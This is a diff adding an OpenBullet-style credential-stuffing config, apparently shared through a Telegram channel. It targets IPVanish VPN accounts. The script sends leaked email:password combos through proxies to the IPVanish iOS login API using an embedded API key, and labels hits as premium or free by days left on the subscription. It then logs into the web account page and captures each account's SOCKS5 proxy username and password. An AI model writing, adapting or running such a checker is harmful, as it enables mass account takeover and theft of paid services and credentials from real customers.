@@ -1,0 +1,135 @@
+[SETTINGS]
+{
+  "Name": "Ipvanish😈Thelokojo",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-09T15:15:16.6434564-05:00",
+  "AdditionalInfo": "https://t.me/Thelokojovip",
+  "Author": "@Thelokojo_vip",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "id" 
+
+REQUEST POST "https://api.ipvanish.com/api/v3/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"os\":\"iOS_14_0_1\",\"api_key\":\"185f600f32cee535b0bef41ad77c1acd\",\"client\":\"IPVanishVPN_iOS_3.7.1_54307\",\"uuid\":\"<id>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": authority: api.ipvanish.com" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-us" 
+  HEADER "content-length: 206" 
+  HEADER "content-type: application/json" 
+  HEADER "user-agent: IPVanishVPN/54307 CFNetwork/1197 Darwin/20.0.0" 
+  HEADER "x-client: IPVanishVPN" 
+  HEADER "x-client-version: 3.7.1_54307" 
+  HEADER "x-platform: iOS" 
+  HEADER "x-platform-version: 14_0_1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The username or password provided is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "refresh_token" 
+
+PARSE "<SOURCE>" JSON "sub_end_epoch" -> VAR "ex" 
+
+FUNCTION CurrentUnixTime -> VAR "ct" 
+
+FUNCTION Compute "((<ex>-<ct>)/86400)" -> VAR "da" 
+
+FUNCTION UnixTimeToDate "<ex>" -> CAP "Expiry Date" 
+
+FUNCTION Round "<da>" -> CAP "Days Left" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Days Left>" EqualTo "0" 
+    KEY "<Days Left>" LessThan "0" 
+  KEYCHAIN Success OR 
+    KEY "<Days Left>" GreaterThan "0" 
+
+FUNCTION Constant "Premium" -> CAP "Account Type " 
+
+REQUEST GET "https://account.ipvanish.com/login/validate" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "d=\"clientToken\" value=\"" "\"/" -> VAR "tk" 
+
+REQUEST POST "https://account.ipvanish.com/login/validate" 
+  CONTENT "clientToken=<tk>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7,mr;q=0.6" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 128" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://account.ipvanish.com" 
+  HEADER "referer: https://account.ipvanish.com/login" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36" 
+
+REQUEST GET "https://account.ipvanish.com/index.php?t=SOCKS5%20Proxy" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<p><b>Username:</b> " "</p>" -> VAR "u" 
+
+PARSE "<SOURCE>" LR "<p><b>Password:</b> " "<br></p>" -> VAR "p" 
+
+FUNCTION Constant "<u>:<p>" -> CAP "Proxy [User:Pass]" 
+
